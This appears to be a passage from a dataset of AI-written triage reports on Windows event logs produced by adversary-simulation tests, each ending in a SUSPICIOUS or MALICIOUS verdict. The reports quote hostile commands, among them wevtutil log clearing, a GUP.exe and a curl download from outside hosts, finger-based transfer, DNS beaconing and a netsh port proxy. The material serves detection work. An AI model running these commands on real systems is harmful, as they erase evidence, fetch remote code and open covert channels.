2. **Command Line Usage with PowerShell:** The repeated execution of PowerShell with commands that are unusual, such as starting `Splashtop Remote` server process using PowerShell, could indicate lateral movement or persistent attempts. However, it is noteworthy that Splashtop Remote is a legitimate remote access tool, and the context of its usage needs to be checked. 

3. **Clearing of Logs:**
   - Events indicate clearing of System and Security logs by the `admin_test` account. Log clearing can generally indicate an attacker attempting to remove forensic evidence.
   - Specific Security Log event ID 1102 and System Log event ID 104 confirm the logs being cleared.

4. **Integrity Level:** The integrity level of processes is consistently high, meaning they run with elevated privileges, which can be concerning if abused in this context.

5. **Process Parentage:** The frequent chaining of conhost.exe, wevtutil.exe, and powershell.exe all under the same user and sometimes with `wsmprovhost.exe` as the parent is not typical for regular administrative tasks and may hint at automated scripts or unauthorized access.

Given these observations, the detected behavior raises sufficient concerns to consider this activity as more than benign - particularly due to the clearing of event logs which is explicitly suspicious if not part of a regular IT procedure. Thus, I suggest pursuing further investigation to understand the intent and origin of these logs.

### Final Resolution: SUSPICIOUS

**Guidance on Next Steps:**
- Verify with the legitimate user or IT team if these actions (particularly, the clearing of logs) were authorized or documented as part of routine maintenance or troubleshooting.
- Conduct thorough endpoint analysis of `Server002`, focusing on the actions taken by the `admin_test` account.
- Monitor for any lateral movements or creation of unusual services/processes stemming from similar activities.
- Review any associated network traffic for connections to unfamiliar or unauthorized external addresses potentially indicating data exfiltration.
- If no authorization for such activities is found, consider this an incident and escalate to internal incident response teams for further investigation and potential containment."
DNS Large Query Volume,"After a comprehensive analysis of the provided Windows event logs, I have identified several activities that are concerning and may suggest malicious intent or behavior. Here's a detailed breakdown of my findings:

1. **Multiple Wevtutil Executions**: There are numerous instances where `wevtutil.exe` is invoked with the `cl` command to clear event logs, specifically `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell` logs. This kind of activity, especially clearing security and sysmon logs, is often associated with malicious attempts to erase traces of compromised or unauthorized activity.

2. **PowerShell Activity**: There is a PowerShell script that repeatedly uses `Resolve-DnsName` with what looks to be an obfuscation technique, querying DNS records with randomized strings (`atomicredteam-$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.nip.io`). This behavior is suspicious as it tries to resolve DNS names against a local IP facilitated by nip.io, which could indicate a DNS exfiltration attempt or command and control channel.

3. **System Log Tampering**: Event ID 104 from the System log indicates that log files are being cleared. The clearing of PowerShell and Security event logs is especially alarming because it's a common practice to remove forensic traces during or after an attack.

4. **Privilege Use**: Multiple high privilege activities associated with user `admin_test` on processes and log activities raise concerns. The actions performed under elevated privileges can facilitate unauthorized access or changes to the system, which isn't typically part of standard user behavior without explicit administrative needs.

5. **Hostname and Whoami Executions**: We see executions of `hostname.exe` and `whoami.exe` which, while they can be legitimate, are often used by attackers post-compromise to fingerprint the system. The context implies enumeration activities.

The combination of these events is highly indicative of post-compromise operations, such as attempts to evade detection by cleaning logs and potentially communicating with a command and control server via obfuscated DNS queries.

### Assessment: MALICIOUS

### Guidance on How to Proceed:
1. **Immediate Containment**: Isolate the affected system from the network to prevent further data exfiltration or lateral movement.
   
2. **Forensic Analysis**: Conduct detailed forensic analysis on the system to determine the initial point of compromise, and gather any potential indicators of compromise (IOCs).

3. **Review User Access**: Verify the legitimacy of activities performed by the `admin_test` user account and ensure the account credentials have not been compromised.

4. **Enhance Monitoring**: Increase monitoring on critical logs and examine logs from other systems to discern if this is part of a larger coordinated attack.

5. **System Hardening**: Implement stricter control on the execution of potentially harmful binaries like `PowerShell` and `wevtutil.exe`, including enabling script block logging and command line auditing.

Responding swiftly to the identified threats and reevaluating security measures will be crucial in mitigating future risks."
LogMeIn Files Detected Test on Windows,"Based on the detailed Windows event log entries provided for analysis, several activities stand out and warrant deeper inspection for potential compromise:

1. **Log Clearing Events (Event IDs 1102, 104):**
   - The logs show multiple instances where event logs were cleared (Event ID 1102 and 104). This activity was conducted by the same user, `admin_test`, which is generally a suspicious activity often linked to attempts to hide malicious activity after the fact. Legitimate scenarios for log clearing are uncommon in regular operations and require proper justification.

2. **Privileges Assigned (Event ID 4672):**
   - High privileges were assigned to the user `admin_test`, including potentially dangerous privileges such as SeDebugPrivilege, which can allow a user to debug and potentially alter critical system processes. Excessive privileges without proper context or need can be an indicator of privilege escalation.

3. **PowerShell Activity:**
   - A PowerShell script is downloading and executing a LogMeIn MSI file. While LogMeIn can be used legitimately for remote administration, its use via PowerShell scripts should be closely audited, especially in the context of a log-clearing event. The quiet installation flag `/quiet` is often used to avoid drawing attention to the installation, which is characteristic of stealthy, often unauthorized software installations.

4. **NTLM Authentication (Event ID 4624):**
   - An NTLM authentication event (logon type 3) occurred from a workstation (`DESKTOP-3HL5B2P`). NTLM protocol can be prone to certain types of abuse and should be observed in conjunction with other suspicious activities already discussed.

5. **Significant Sysmon Events:**
   - There are multiple invocations and terminations of `wevtutil.exe`—a utility used to clear event logs—and these are closely time-aligned with various log-clearing events, often one of the evasion tactics used by malicious actors.

6. **Installation of LogMeIn Software:**
   - The installation process completed successfully (Event ID 11707), which can indicate that the downloaded LogMeIn software was fully deployed. This is possibly shadow remote management that might align with unauthorized access patterns depending on its legitimate or illegitimate purpose.

**Assessment and Resolution:**

The combination of log clearing, high privilege assignments, NTLM authentication events, automated PowerShell script download and install activities all point towards suspicious activity that can be associated with malicious intent, particularly when viewed collectively. The specifics about the downloading and installation of remote software without clear evidence of legitimate administrative operations further deepens this suspicion.

**Resolution: SUSPICIOUS**

I recommend a deeper investigation into the source and intent of these activities, with particular focus on the `admin_test` account, the origin of these commands (matching IP addresses/workstation and user activity), changes to security configurations, and the installed LogMeIn software's activity to determine the true intent and prevent any potential ongoing threat or unauthorized remote access. Consider implementing additional monitoring and forensic auditing on involved systems and accounts."
Splashtop Execution,"After analyzing the provided Windows event logs across different categories (Application, Security, Sysmon, System, and Windows PowerShell), here's a breakdown of the notable points:

1. **Installation and Execution Activities:**
   - There are multiple entries related to InstallShield installer activities (`_is8B2A.exe`) and `setup.exe` from Microsoft Edge Installer. These activities are mostly benign as they relate to installation processes, generally associated with software installations or updates.
   - The entries related to Splashtop Personal application installation appear legitimate given the context of software updates or new installations.

2. **Log File Clearance:**
   - Logs from both the Security and System channels were cleared by the `admin_test` account, as indicated by Event ID 1102 in the Security log and Event ID 104 in the System log.
   - Clearing event logs is highly suspicious, especially when it coincides with potential installation of software or other administrative activities. It suggests an attempt to cover up actions, possibly indicative of malicious intent or policy non-compliance.

3. **Unusual PowerShell Activity:**
   - PowerShell logs show a command starting a process with Splashtop. The use of PowerShell to run applications, in and of itself, isn’t inherently suspicious but when combined with other suspicious activities like log clearance, it raises concerns.
   - PowerShell is often used by attackers for living-off-the-land attacks; hence any unusual executions deserve a deeper dive.

4. **Sysmon Logs and Activities:**
   - Sysmon captures highlight repeated execution of Microsoft Edge setup processes. This activity seems normal in the context of software update procedures.
   - There is PowerShell execution and creation of processes from temporary directories, which can be part of normal operations but should be subjected to scrutiny given the concurrent log clearing.

5. **User Behavior and Accounts:**
   - Administrative accounts like `admin_test` conducting potentially dubious activities necessitate verification of the user's actions or to check if the account might be compromised.

### Assessment

- **SUSPICIOUS**: The combination of log clearance, PowerShell executions, and temporary directory software installations compels further investigation. While many actions could be benign in a software update context, log clearing and the timing of executions warrant heightened scrutiny.

### Recommendation to Proceed

1. **Investigate the Motive of Log Clearing**: 
   - Engage the `admin_test` user to clarify the intention or necessity of clearing log files.

2. **Examine Account Validity**:
   - Verify `admin_test` account activities to rule out compromise. Check for unauthorized access attempts or extraneous actions.

3. **Analyze PowerShell Executions**:
   - Review scripts or commands executed via PowerShell to ensure no malicious payloads were involved.

4. **Reassess Network and Protection Settings**:
   - Conduct a broader audit of the system settings and protections to ensure they meet security benchmarks.
   
5. **Alert Monitoring**:
   - Consider increasing monitoring settings for this system and others similar in infrastructural role to detect anomalies early.

Proceed with caution by delving deeper into the activities and patterns noted in logs, combining them with the overall security posture of the system."
DNS Regular Beaconing,"Upon analyzing the provided Windows event logs, several indicators suggest potentially suspicious and malicious activity:

1. **PowerShell Activity**: The logs show the execution of a PowerShell command with the script `T1071-dns-beacon.ps1`. This script appears to mimic or test the behavior of DNS-based communication often associated with malware, as indicated by the use of a subdomain and domain resembling loopback addresses (`127.0.0.1.nip.io`) for potential command and control (C2) beaconing. This script matches a known ATT&CK technique (`T1071.004`) for malware communications.

2. **Event Log Clearing**: The system, application, and security logs show entries where logs have been cleared. This activity is particularly suspicious because log clearance can be indicative of an attempt to cover tracks after a compromise or during a malicious operation. The clearing of PowerShell logs during or after executing suspicious scripts further compounds the suspicion.

3. **Use of `wevtutil.exe`**: Multiple instances of `wevtutil.exe` are shown executing commands to clear event logs. This tool, when used with the command line to clear logs, can indicate malicious activity as it's often used to delete evidence of an attack.

4. **System Time Change**: The security logs show events where the system time was altered. Manipulating system time can be a tactic to avoid detection or to mislead log analysis tools and processes. Although this might occasionally be benign, in the context of other suspicious activities, it raises concerns.

5. **Execution of High-Integrity Commands**: All activities were executed with high integrity, indicating administrator-level permissions. This heightened privilege usage in conjunction with suspicious activities further suggests potential compromise or malicious intent.

6. **Account and User Context**: The user `admin_test` performs the suspicious activities. It is crucial to assess whether this account was compromised or if the actions were legitimate but poorly documented tests (unlikely in a real-use setting without prior notice).

Considering the above points, the events in the logs contain behaviors that are unexplained and inconsistent with normal administrative tasks. Additionally, the presence of security evasion techniques such as log deletion, use of potentially malicious scripts, and system time manipulation are significant red flags.

**Resolution: MALICIOUS**

**Recommendations:**

- **Immediate Isolation**: Temporarily isolate the affected host (Server002) to prevent potential propagation of compromise.
- **User and Credential Review**: Review recent activities and access patterns for the `admin_test` account. Investigate for signs of credential theft or unauthorized access.
- **Forensic Investigation**: Perform a detailed forensic analysis of the affected system to confirm the scope of the activity and identify potentially dropped or running malware.
- **Monitoring and Detection**: Heighten monitoring on the network for additional indicators of compromise related to DNS tunneling and other evasion techniques.
- **Log Retention and Analysis**: Adjust log retention policies and investigate backup copies for log entries that may have been cleared.
- **Update Security Protocols**: Review and update security policies to prevent misuse of administrative tools and ensure appropriate use monitoring."
Curl Download File,"### Analysis:

Upon reviewing the provided Windows event logs for suspicious or anomalous behavior, the following key points were identified:

1. **Event Log Clearing:**
   - Security Event Log ID 1102 and System Event Log ID 104 indicate that both the security and certain other system logs were cleared by the user ""admin_test"" with SID `S-1-5-21-3962163828-2803415714-1403596700-1006`. Clearing logs can be indicative of an attempt to hide illicit activity.

2. **Time Manipulation:**
   - Security Event ID 4616 shows a backward alteration of system time, which was adjusted from 11:48:43 to 11:48:38. Time manipulation can be used to evade security measures or to hide activities within a logging environment.

3. **Command Execution and Network Activity:**
   - Sysmon logs (Event ID 1) show the usage of `cmd.exe` to execute multiple `curl.exe` commands aimed at downloading a suspicious DLL file `AllTheThingsx64.dll` from an external source (`github.com/redcanaryco/atomic-red-team`). This behavior is highly indicative of potentially malicious activity, as unknown DLLs from internet repositories can be associated with malware or unauthorized access attempts.

4. **Microsoft Edge Update Activity:**
   - There are numerous entries related to Microsoft Edge Update processes executing and being stopped. While updating software is normal, repeated and numerous installations or updates in a short period can sometimes be used to cover up malicious activities but, by themselves, are typically benign especially when seen as system-level processes.

### Assessment:

The logs contain several indicators of potentially malicious activity:

- **Log clearing** could suggest an attempt to hide actions and is significantly suspicious.
- **Time changes** on the system could be indicative of efforts to manipulate timestamps to disguise activity.
- **Download of a suspicious DLL via `curl` using `cmd.exe`** shows a direct attempt to fetch and possibly execute external code, which is a stark indicator of malicious activity especially when referencing repositories known for penetration testing toolkits.

### Resolution:

- **MALICIOUS** - The logs provide clear evidence of malicious activity, such as the download of suspicious files, system time manipulation, and event log clearing.

### Guidance:

1. **Immediate Next Steps:**
   - Disconnect the affected host (""Server002"") from the network to prevent further compromise.
   - Initiate a full investigation to determine what other parts of the network may be affected.

2. **Forensics and Recovery:**
   - Analyze the downloaded files and any scripts or executables run on the system using specialized anti-malware software.
   - Collect and preserve logs, memory snapshots, and other forensic evidence for further investigation or legal considerations.

3. **Preventative Measures:**
   - Tighten logging and monitoring controls, ensuring logs are centralized and immutable.
   - Update policies to restrict outbound internet communication for critical servers and apply stricter privilege controls.

4. **Long-Term Steps:**
   - Provide security training for users to identify suspicious activities and reinforce the importance of security policies.
   - Implement intrusion detection systems (IDS) and enhance threat intelligence mechanisms to better detect future threats.

By following through with these steps, the security posture of the organization can be significantly improved, reducing the risk of similar incidents in the future."
Nimgrab - Transfer Files,"After carefully reviewing the provided Windows event logs, several indicators of potentially suspicious activities are present:

1. **Log Clearing:** 
   - The logs show multiple instances of log clearing commands executed using `wevtutil.exe`, for the channels: Sysmon, Application, System, Security, and Windows PowerShell. Log clearing is a common technique used by attackers to cover their tracks and avoid detection.
   - The user associated with these commands is `SERVER002\\admin_test`, and all commands run with high integrity level, suggesting administrative privileges were used.

2. **Usage of `cmd.exe`:**
   - The logs indicate the execution of `cmd.exe` with unusual command-line arguments. Specifically, the command includes a path to `nimgrab.exe` from an external source (GitHub URL), suggesting a potential unauthorized download and execution of a payload. This behaviour is indicative of a ""living off the land"" (LotL) technique, where native tools are leveraged for malicious purposes.

3. **Process Execution:**
   - The presence of several `conhost.exe` processes accompanying other process executions like `wevtutil.exe`, `cmd.exe`, and others could suggest an attempt to hide malicious activity in conjunction with system-native processes. While `conhost.exe` is a valid Windows process, its consistent and frequent association with the outlined events raises suspicion.
   
Given these indicators:

- **Resolution:** **MALICIOUS** 
- **Assessment:** The logs reveal suspicious activities including the clearing of various critical logs and the execution of potentially harmful command-line operations linked to external payloads. Collectively, these behaviors are strongly indicative of malicious intent, likely an attempt to execute unauthorized tasks while obfuscating traces.

**Guidance on How to Proceed:**
- **Immediate Action:**
  - Investigate and segregate the affected machine to prevent further potential compromises.
  - Conduct a thorough forensic analysis to understand the extent of the compromise.
  - Identify and block any unauthorized IP addresses or domains.
  - Update security measures and review current access control policies.

- **Long-term Recommendations:**
  - Implement enhanced logging and monitoring, ensuring logs are sent to a secure, central location out of reach from endpoint tampering.
  - Educate users on security best practices, focusing on the risks of downloading and executing unknown scripts or files.
  - Regularly update and patch systems to mitigate vulnerabilities."
File download with finger.exe on Windows,"### Detailed Analysis of Windows Event Logs

#### 1. Log File Clearing
The logs indicate the use of the `wevtutil.exe` command to clear event logs, as shown in the following events:
- **Security Log Cleared**: The `wevtutil.exe` command was used to clear the Security event log (`EventID 1102`).
- **System Log Cleared**: The `wevtutil.exe` command was used to clear the System event log.
- **Windows PowerShell Log Cleared**: The `wevtutil.exe` command was used to clear the Windows PowerShell event log.

Clearing Event Logs is a common technique used by attackers to cover their tracks, indicating potentially malicious activity.

#### 2. Privileged Account Activities
The analysis shows activities involving the `admin_test` user, including:
- Multiple privileged logons (`EventID 4624, LogonType 3`), suggesting remote access.
- Usage of high-level privileges (`EventID 4672`), including `SeDebugPrivilege`, which is often abused for malicious purposes.

#### 3. Suspicious Command Execution
The logs reveal unusual command execution, specifically:
- **Command Execution Event**: The execution of `cmd.exe` with a suspicious command line: `cmd.exe /c finger base64_filedata@localhost`.
- **Associated Execution of `finger.exe`**: Followed by `finger.exe` execution, commonly used for user enumeration in certain contexts, which seems out of place.

#### 4. Processes and Activities Consistent with Compromise
- The process chain initiated by `wsmprovhost.exe` (usually related to Windows Remote Management, which can be misused) triggered the command prompt (`cmd.exe`) and subsequently executed potentially suspicious network-oriented command (`finger.exe` targeting localhost).

- **NTLM Authentication**: Repeated NTLM authentication logons with different `TargetLogonId` could indicate unauthorized network access.

- **High Integrity Level Processes**: We see high integrity processes executed during this analysis window, adding to the suspicions when combined with the log-clearing events.

#### 5. EdgeUpdate and System Processes
Microsoft Edge Update-related activities are generally benign and look standard here. System-level processes (`sppsvc.exe`, `TiWorker.exe`, etc.) also appear routine in these logs but do not directly align with suspicious activities noted elsewhere.

### Assessment and Resolution:
The evidence provided depicts multiple security-relevant activities:
- Log file clearing events, especially for Security and System channels.
- Privileged user with excessive privileges.
- Execution of potentially malicious command lines.
- NTLM network logons and associated suspicious usages such as `wsmprovhost.exe` and `cmd.exe` with concerning commands.

Based on the examination, the log activities contain indicators consistent with potential compromise, especially due to the combination of log clearing, privileged access, and suspicious command execution.

### Final Resolution:
**MALICIOUS** - The logs contain activities indicative of a deliberate attempt to hide malicious actions, involving privileged accounts, suspicious command execution, and log tampering. Immediate incident response actions are recommended to investigate and mitigate potential breaches."
Steganographic Tarball Embedding,"### Analysis of the Event Logs:

1. **Microsoft Edge Installer Executions:**
   - Multiple instances of `setup.exe` for Microsoft Edge Installer are observed. This activity involves detailed command-line arguments indicating typical software update operations. 
   - The processes are executed by `NT AUTHORITY\SYSTEM` with a System Integrity Level, implying legitimate privileged execution.

2. **PowerShell Execution:**
   - A notable PowerShell command is executed by the user `SERVER002\admin_test` which involves file manipulation. The PowerShell command appears to read content from a file and write it to another. The file paths and the context (working with temp directories and image files) can be associated with data manipulation.
   - The file path includes ""AtomicRedTeam,"" a known open-source repository used for simulating adversary techniques to test security controls, suggesting the execution might be a part of a security simulation or assessment.
   - The PowerShell execution is run at a High Integrity Level, executed by a user with administrative privileges.

3. **Event Log Clearing:**
   - Several instances of `wevtutil.exe` are executed by `SERVER002\admin_test` to clear multiple Windows event logs: Sysmon, System, Windows PowerShell, Application, and Security channels.
   - Clearing event logs is a common tactic used by malicious actors to cover their tracks, and it suggests attempts to conceal activities.

4. **Anomalous Activity Summary:**
   - The combination of PowerShell usage for file manipulation and clearing event logs by an administrative user points towards potential malicious behavior. 
   - While the PowerShell activity involving ""AtomicRedTeam"" hints at possible security testing, the subsequent log clearing simultaneous with the testing is highly suspicious.

### Assessment & Risk Evaluation:

- **Suspicious Behavior:**
  - The activities of `admin_test`, including execution of scripts from the `AtomicRedTeam` directory and clearing logs, are suspicious and indicative of either unauthorized activity or poorly documented security assessments. These could potentially be simulated threat activities, but due care must be taken to verify the legitimacy of these actions.

### Resolution:

- **RESOLUTION: SUSPICIOUS**

### Guidance on Proceeding:

1. **Immediate Action:**
   - Confirm with the relevant teams (e.g., security or IT operations) if the `AtomicRedTeam` scripts and log clearing were authorized as a part of a scheduled or approved security assessment.
   - Review organizational policies on event logging and ensure proper documentation for similar activities in the future.

2. **Further Investigation:**
   - Conduct interviews with the user `admin_test` or management to ascertain the legitimacy of the PowerShell command and the log clearing actions.
   - Analyze audit trails or other security logs for additional context or potential unauthorized access attempts around the same timeframe.

3. **Mitigation Measures:**
   - If unauthorized, perform immediate incident response procedures to contain potential threats and review access controls.
   - Reinforce logging mechanisms and ensure trails are collected and monitored even during internal assessments.

By taking these steps, you can better understand the context of the activities and ensure the security of the system."
MAZE Propagation Script,"After reviewing the logs provided, I have observed the following suspicious activities that stand out:

1. **Event Log Clearing**: The Security log includes an event indicating that the event logs were cleared by a user named `admin_test` at `2024-10-24 11:59:07.4099888` (EventID 1102). The clearing of logs can be a strong indicator of malicious actions since attackers often clear logs to cover their tracks.

2. **Sysmon Event**: Multiple instances of `wevtutil.exe` have been executed within a short time frame with the command line arguments for clearing event logs (such as ""cl Microsoft-Windows-Sysmon/Operational""). This utility is often used for administrative tasks but can be used maliciously to hide unauthorized activities by clearing evidence from event logs.

3. **PowerShell Activity**: There are suspicious PowerShell commands in the logs. The command includes attempts to copy a file and remotely execute it across multiple machines using `cmd`, `copy`, and `wmic`. These actions were recorded in the Windows PowerShell log (EventID 600), indicating potential lateral movement or execution of unauthorized scripts.

4. **Process Execution**: The Sysmon logs also show various suspicious executions, such as PowerShell being executed with a script that interacts with networked machines and potentially malicious payload distribution (`T1105.exe`), which matches the MITRE ATT&CK technique ID T1105 (Transfer Files from a Compromised Host).

5. **Sequence of Processes**: The creation and termination of processes in rapid succession at high integrity level involving PowerShell and event utilities indicate an endeavor of rapid execution, often leveraged by automated scripts, which is unusual for benign administrative tasks.

Based on these observations, it's clear there are indicators of a possible compromise. The combination of event log clearing, suspicious PowerShell script execution, and event utility invocation to clear logs suggests a non-benign activity aimed at obfuscating unauthorized actions.

**Resolution: MALICIOUS**

Given these indicators, I am confident this is a malicious activity. Immediate steps should be taken to:

- Isolate the affected system to prevent further compromise or lateral movement.
- Conduct a thorough investigation to determine the full extent of the breach and potential data exfiltration.
- Review and secure other systems in the network for similar actions.
- Inform the incident response team to initiate response protocols.
- Check backup integrity and ensure that systems can be restored to a secure state if needed."
Arbitrary file download using the Notepad++ GUP.exe binary,"The provided logs present several indicators of potentially suspicious activity. Let's break down these logs and analyze any anomalous behavior and its implications:

1. **Log File Cleared Events**:
   - The System log contains events indicating that different logs (System, Windows PowerShell) were cleared by the user `admin_test`. Similarly, the Security log shows a clearance event with EventID 1102. Log file clearance can be a red flag as it may indicate an attempt to cover up malicious activities.

2. **Suspicious Command-Line Activity**:
   - The Sysmon logs show a command-line execution involving `cmd.exe` with command-line arguments reflecting a download from an external URL: `cmd.exe /c mkdir ""c:\\Temp"" & cd C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1105\\bin\\ & GUP.exe -unzipTo """" ""C:\\Temp"" ""Sample https://getsamplefiles.com/download/zip/sample-2.zip""`. The use of command-line operations to create directories and subsequently download or handle files from the internet is often used in malware delivery and should definitely be investigated.

3. **Application and PowerShell Log Clearance**:
   - The Events highlight that the System and Windows PowerShell logs were cleared almost simultaneously, which is concerning as it might indicate an erasure of activities such as script execution or other potentially malicious actions.

4. **Process Execution Context**:
   - Multiple `wevtutil.exe` (Eventing Command Line Utility) instances were seen running, which are used to clear logs. The process execution involved `admin_test` and ran at a high integrity level, again suggesting an intentional attempt to tamper with or hide the logs.
   
5. **Execution of Diagnostic Commands**:
   - Execution of standard diagnostic commands such as `HOSTNAME.EXE` and `whoami.exe`, which can be typical in attacks for reconnaissance purposes to get system and user information.

**Assessment**:
- **SUSPICIOUS**: These logs contain activities that are suspicious and warrant further investigation. The log clearing by `admin_test`, combined with the command-line activity involving potential file downloading from an external source, raises serious concerns about malicious behavior.

**Recommendations**:
1. **Investigate the User `admin_test`**: Review the activities and privileges associated with the `admin_test` account to understand if it has been compromised.
2. **Network Analysis**: Check through network logs for any connections made to suspicious external IPs or domains around the time of these events.
3. **Forensic Analysis**: Conduct a deeper forensic analysis on `Server002` to check for changes in the system and artifacts that might further confirm any malicious activity.
4. **Enhance Monitoring**: Increase monitoring on critical systems, especially for unauthorized log clearances, and implement stricter logging, access controls, and anomaly detection systems.
5. **Review Security Policies**: Ensure security policies are robust and users are educated on recognizing potential security threats.

Given the evidence, this activity cannot be conclusively confirmed as malicious without further analysis but remains suspicious enough to consider immediate action."
ScreenConnect Application Download and Install on Windows,"Upon reviewing the provided logs, several activities stand out that require further analysis:

1. **Installation of ScreenConnect**: 
   - The logs indicate the download and attempted installation of `ScreenConnect.msi` via a PowerShell script, as captured in the Application, Sysmon, and Windows PowerShell logs. The download was performed using `Invoke-WebRequest` and installed silently via `msiexec /i /qn`. ScreenConnect is a legitimate remote desktop software, but its unauthorized use might pose a security risk by allowing unauthorized remote access to the system.

2. **Event Log Clearing**:
   - The System logs and Security logs show events indicating the clearing of Event Logs by the user `admin_test`. This is generally considered suspicious, particularly when performed in proximity to other potentially malicious actions. Log clearing can be an attempt to cover tracks.

3. **Time Manipulation**:
   - The Security logs contain multiple `EventID: 4616` indicating a change in system time. Time changes can indicate an attempt to manipulate time-stamped logs or correspond with specific timings needed for an attack.

4. **Use of High-Integrity Processes**:
   - Many processes, including `wevtutil.exe` and `msiexec.exe`, were run with high integrity. While this alone is not indicative of malicious activity, in conjunction with other suspicious actions, it warrants further investigation.

5. **PowerShell Activity**:
   - Several PowerShell events are recorded, specifically focusing on the execution of scripts related to downloading and installing software, which is consistent with malicious script execution patterns.

### Assessment:
- **SUSPICIOUS**: The activity observed in the logs is suspicious and warrants further investigation. The silent download and installation of software, clearing of event logs, and manipulation of system time are indicators that could potentially lead to system compromise.

### Recommendations:
- **Investigate ScreenConnect Installation**: Verify if the installation of ScreenConnect was authorized. If not, consider its removal and check network configurations for remote access vulnerabilities.
- **Audit User Activity**: Conduct a thorough audit of the user `admin_test`, as their account was involved in all suspicious activities. Ensure their actions were authorized if they are responsible for system administration.
- **Review System Time Changes**: Confirm whether time changes were necessary or authorized; unauthorized changes could indicate attempts to obfuscate log timelines.
- **Increase Monitoring**: Enhance monitoring for unusual login attempts, privilege escalation, and system modifications, especially related to other administrative scripts or software launches.
- **Security Policy Review**: Review and potentially tighten security policies regarding software installations, PowerShell execution policies, and log retention practices.

Ultimately, follow-up investigations should confirm the legitimacy or malicious intent behind these activities and ensure appropriate security measures are reinforced."
Lolbas replace.exe use to copy file,"Upon analyzing the provided event logs from Sysmon, Security, System, and other relevant channels, I identified several key points that are suggestive of potentially malicious activity, warranting a classification of ""MALICIOUS"" based on the following observations:

1. **Use of `wevtutil`**: The Sysmon logs report multiple invocations of `wevtutil.exe` with the `cl` command to clear event logs (e.g., Microsoft-Windows-Sysmon/Operational, Security). Clearing event logs is a classic technique used by attackers to remove traces of their activity from the system logs.

2. **Log-Clearing Events**: Corresponding Security and System logs show entries with Event ID `1102` (Security log cleared) and `104` (System log cleared), executed by the same user (`admin_test`). The occurrence of log-clearing events, especially just after suspicious activities, is highly indicative of an attempt to cover tracks.

3. **Suspicious Batch Command**: The Sysmon logs demonstrate the execution of a suspicious command using `cmd.exe` that involves the deletion of files in the `%TEMP%` directory, and manipulation with `replace.exe`. This suggests an attempt to alter or replace files, which might be indicative of an attempt to implant or remove evidence of malicious software.

4. **Unusual Activity Timeline**: The rapid succession of these events within a short timeframe — involving utility executions, file manipulations, and log clearances — further underscores potential malicious intent, as it suggests a targeted action rather than typical user behavior.

5. **High-Integrity Processes**: The logs show that the processes were running under a high integrity level, often indicative of elevated privileges, which is commonly used in attacks to maximize access and control over the host system.

Conclusion and Recommendations:
- **Resolution: MALICIOUS**: The observed activities align with typical attacker behaviors, particularly with respect to log clearance to erase evidence and the manipulation of system utilities in a high-integrity context.
- **Immediate Mitigation**: Conduct an immediate containment operation to isolate the affected system and prevent further malicious activity or lateral movement within the network.
- **Forensic Investigation**: Perform a deeper forensic investigation into the user `admin_test` and correlate other logs from adjacent systems and network traffic to identify potential external connections or further indicators of compromise.
- **Strengthen Logging and Monitoring**: Enhance logging and monitoring policies to detect similar activities in real-time and consider implementing advanced threat detection solutions to automatically flag and alert on suspicious activities such as log clearing and usage of administrative tools like wevtutil.

Overall, the logs strongly suggest that an adversary may have compromised the system, and immediate action is required to secure the environment and investigate the full extent of the breach."
portproxy reg key,"## Detailed Log Analysis

Upon reviewing the provided logs, several actions stand out that warrant further investigation due to potential signs of malicious activity.

### 1. PowerShell Log Activities

- **Command Excecution**:
  - A series of PowerShell commands executed on `Server002` show the command `netsh interface portproxy add v4tov4 listenport=1337 connectport=1337 connectaddress=127.0.0.1` running. This is used to redirect network traffic and could potentially be indicative of data exfiltration or a covert channel setup.

### 2. Sysmon Log Activities

- **Usage of `wevtutil.exe`**:
  - Multiple instances of `wevtutil.exe` are run with the command line clearing multiple logs (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell`). This could indicate an attempt to clear logs to hide tracks, which is indicative of malicious activity.
  
- **Command Execution Patterns**:
  - Commands like `whoami` and `hostname` are executed. These could be part of initial reconnaissance activities to gather system information by an attacker.

- **Netsh Operation**:
  - The execution of `netsh` with the parameters related to port proxying corresponds with the PowerShell logs, suggesting a stable operation to redirect traffic.

### 3. Security Log Activity

- **Log Cleared Events**:
  - `Event ID: 1102`, the security log was cleared. The user context (`SERVER002\\admin_test`) performing this action aligns with suspicious behavior, especially since this event immediately follows the log clearing commands seen executed via `wevtutil.exe`.

### 4. System Log Activity

- **Log Cleared Events**:
  - Similar observations as the security logs, with events indicating log clears for the `System` and `Windows PowerShell` logs, reflecting actions executed under the same user credentials.

## Assessment and Resolution

### Assessment

- The execution of PowerShell commands to set up a port proxy, combined with subsequent `wevtutil.exe` executions to clear event logs, is highly suspicious.
- Clearing logs, particularly the Security log, is a strong indication of an attempt to cover up other activities.
- Reconnaissance commands like `whoami` and checking `hostname` appear alongside these actions, supporting the hypothesis of an external or internal actor exploring the system.

### Threats and Risks

- **Privilege Escalation**: The use of high integrity level processes to clear logs could indicate potential misuse of administrative privileges.
- **Data Exfilteration or Network Tunneling**: Setting a port proxy could be used for redirecting sensitive data.
- **Undetected Malicious Activities**: Clearing logs make it difficult to trace any unauthorized access or changes made.

### Guidance on Next Steps

- Immediately investigate the user account activity, especially focusing on the `admin_test` user.
- Review firewall and network logs for unusual traffic patterns corresponding to port 1337.
- Conduct a vulnerability assessment on `Server002` to identify potential exploitation or compromise of services.
- Implement additional monitoring and detection controls, such as alerting on log clear operations.
  
### Resolution

Given the outlined activities, the logs lead to a resolution of:

- **MALICIOUS**: The combination of log clearing, unsanctioned port proxy, and related tool execution aligns with behavior seen during system compromise. Immediate action is required to mitigate risk and prevent further unauthorized activities."
Download a file with Microsoft Connection Manager Auto-Download,"### Analysis of the Logs:
- **Suspicious PowerShell Activity:** The execution of `powershell.exe` by `admin_test` is often a vector for malicious activities. However, without specific commands executed or a script, this is not overtly suspicious but warrants further examination.
  
- **Event Log Clearing:** Multiple instances of the `wevtutil.exe` command are noted for clearing event logs. The commands `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`, `wevtutil.exe cl Application`, `wevtutil.exe cl System`, `wevtutil.exe cl Security`, and `wevtutil.exe cl ""Windows PowerShell""` are executed by the user `admin_test`. This activity is highly suspicious as clearing event logs can be an attempt to cover tracks post-activity.

- **Event ID 1102 in Security Logs:** This event indicates that the security event log was cleared by `admin_test`. The clearing of logs is a clear indicator of an attempt to cover malicious actions.

- **Several Wevtutil Executions:** Given the short time frame, this behavior is not typical and suggests an attempt to erase evidence of potentially unauthorized or malicious activities.

